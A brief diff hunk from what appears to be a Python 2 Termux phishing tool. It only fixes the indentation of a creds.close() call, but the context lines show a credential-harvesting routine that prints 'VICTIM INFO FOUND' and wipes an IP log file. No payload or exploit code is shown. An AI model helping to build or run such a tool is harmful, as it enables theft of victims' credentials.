@@ -142,8 +142,8 @@ def waitCreds():
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
             print '================================================='.format(RED, END)
-	
-	creds.close()
+
+        creds.close()
 
 def runPEnv():
     system('clear')
